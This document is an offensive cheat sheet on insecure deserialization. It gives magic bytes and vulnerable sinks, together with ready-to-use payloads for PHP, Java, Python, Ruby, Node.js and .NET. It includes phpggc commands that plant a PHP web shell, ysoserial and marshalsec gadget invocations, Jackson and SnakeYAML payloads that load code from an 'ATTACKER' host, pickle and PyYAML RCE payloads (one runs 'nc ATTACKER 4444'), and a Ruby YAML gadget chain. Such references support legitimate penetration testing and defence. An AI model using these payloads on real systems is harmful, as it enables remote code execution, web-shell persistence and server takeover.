# Insecure Deserialization Reference

## Magic Bytes / Identifiers

| Format | Magic Bytes | Base64 Prefix |
|--------|-------------|---------------|
| Java (binary) | `AC ED 00 05` | `rO0` |
| Java (GZIP) | `1F 8B` | `H4sI` |
| PHP object | `O:` or `a:` | - |
| PHP serialized | `Tz:` | - |
| .NET BinaryFormatter | `00 01 00 00 00 FF FF FF FF` | `AAEAAD` |
| .NET ViewState | `FF 01` | `/w` |
| Python pickle | `80 04 95` | - |
| Ruby Marshal | `04 08` | - |
| YAML | text `---` | - |

---

## PHP Deserialization

### Magic methods triggered
```php
__wakeup()    // Called on unserialize()
__destruct()  // Called when object destroyed
__toString()  // Called when object used as string
__call()      // Called on non-existent method call
```

### Auth bypass via type juggling
```php
# If code does: if ($user->pass == "admin_hash")
# Serialize: O:4:"User":1:{s:4:"pass";b:1;}  → pass = TRUE → always equals
# b:1 = boolean true
```

### Object injection gadget chains (phpggc)
```bash
phpggc --list
phpggc Laravel/RCE1 system id
phpggc Symfony/RCE4 exec 'id > /tmp/id.txt'
phpggc SwiftMailer/FW1 exec 'id'
phpggc Monolog/RCE1 exec 'id'
phpggc Guzzle/FW1 write /var/www/html/shell.php '<?php system($_GET["cmd"]); ?>'
phpggc -b Doctrine/FW1 file_write /var/www/html/shell.php payload.php  # base64
```

### phar:// deserialization
```php
# If phar:// reaches require/include/file_get_contents/fopen etc.
# Create phar with embedded serialized payload
<?php
$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata($maliciousObject);
$phar->stopBuffering();
# Rename to image: mv exploit.phar exploit.jpg
# Trigger: include('phar://./exploit.jpg');
```

---

## Java Deserialization

### Detection
```
# In HTTP request body/cookie:
rO0AB... (base64)
AC ED 00 05 (hex in binary)
H4sIAAAAAAAA... (gzip base64)
```

### ysoserial gadget chains
```bash
# Common chains
java -jar ysoserial.jar CommonsCollections1 "id > /tmp/out" | base64
java -jar ysoserial.jar CommonsCollections2 "id" | base64
java -jar ysoserial.jar CommonsCollections6 "id" | base64
java -jar ysoserial.jar Groovy1 "id" | base64
java -jar ysoserial.jar Spring1 "id" | base64
java -jar ysoserial.jar ROME "id" | base64
java -jar ysoserial.jar BeanShell1 "id" | base64
# DNS test (no exploit, just SSRF)
java -jar ysoserial.jar URLDNS "http://ATTACKER.com" | base64
```

### marshalsec (for JSON/YAML deserializers)
```bash
# Jackson
java -cp marshalsec.jar marshalsec.jackson.JacksonInteropEvalThingies SpringPropertyPathFactory "id"
# SnakeYAML
java -cp marshalsec.jar marshalsec.YAMLSnake JdbcRowSetImpl "http://ATTACKER/Payload.class"
```

### JSON deserialization (Jackson)
```json
// CVE-2017-7525 (Jackson-databind): requires @type key
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ATTACKER/Exploit","autoCommit":true}
// CVE-2019-12384 (Jackson Xalan)
{"@type":"org.springframework.transaction.jta.JtaTransactionManager","userTransactionName":"rmi://ATTACKER/Exploit"}
```

### SnakeYAML RCE
```yaml
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://ATTACKER/Exploit.jar"]]]]
```

### JSF ViewState
```bash
# MyFaces DES encrypted ViewState (default key: "NED.")
# Crack with BurpSuite or Paros
# Or with blacklanternsecurity/badsecrets
python3 -m badsecrets.examples.cmd viewstate "VALUE" "VIEWSTATE_MAC"
```

---

## Python Deserialization

### Pickle RCE
```python
import pickle, os, base64

class RCE:
    def __reduce__(self):
        return (os.system, ("id",))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
```

### Universal payload (eval-based)
```python
import pickle, base64

class Evil:
    def __reduce__(self):
        return eval, ("__import__('os').system('id')",)

print(base64.b64encode(pickle.dumps(Evil())).decode())
```

### Sinks to look for
```python
pickle.loads()
cPickle.loads()
_pickle.loads()
jsonpickle.decode()
```

### PyYAML RCE
```yaml
!!python/object/apply:os.system ["id"]
!!python/object/apply:subprocess.Popen [["id"]]
!!python/object/apply:os.popen ["nc ATTACKER 4444"]
!!python/object/new:subprocess [["ls","-la"]]
```

Vulnerable sinks:
```python
yaml.load(input)                          # PyYAML < 6.0
yaml.unsafe_load(input)                   # PyYAML 6.0+
yaml.load(input, Loader=yaml.UnsafeLoader)
```

---

## Ruby Deserialization

### Marshal
```bash
# Test gadget chain against Ruby 2.0-2.5
for i in {0..5}; do docker run -it ruby:2.${i} ruby -e 'Marshal.load([...hex...].pack("H*")) rescue nil'; done
```

### YAML (Ruby 2.x - 3.x universal gadget)
```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
```

Vulnerable sink:
```ruby
YAML.load(File.read("user_data.yml"))  # Vulnerable (Ruby < 3.1)
```

---

## Node.js Deserialization

### node-serialize (CVE-2017-5941)
```json
// Serialize normally, then add () to trigger IIFE
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id', function(err,out){ console.log(out) });}()"}
```

### funcster
```json
{"rce":{"__js_function":"function(){CMD=\"id\";const process=this.constructor.constructor('return this.process')();process.mainModule.require('child_process').exec(CMD,function(err,out){console.log(out)});}()"}}
```

---

## .NET Deserialization

### Detection
```
AAEAAAD (base64 prefix for BinaryFormatter)
FF01 / /w (ViewState)
```

### ysoserial.net
```bash
# JSON.NET
./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc.exe" -t
# BinaryFormatter
./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
# XmlSerializer
./ysoserial.exe -g ObjectDataProvider -f XmlSerializer -c "calc.exe"
# Gadgets: ObjectDataProvider, TypeConfuseDelegate, PSObject, WindowsIdentity
```

### Formatters (sinks to look for in code)
```csharp
XmlSerializer(typeof(<TYPE>));              // XmlSerializer
DataContractSerializer(typeof(<TYPE>))      // DataContractSerializer
NetDataContractSerializer().ReadObject()    // NetDataContractSerializer
JsonConvert.DeserializeObject<T>(json, ...)  // JSON.NET
System.Runtime.Serialization.Binary.BinaryFormatter  // BinaryFormatter
```
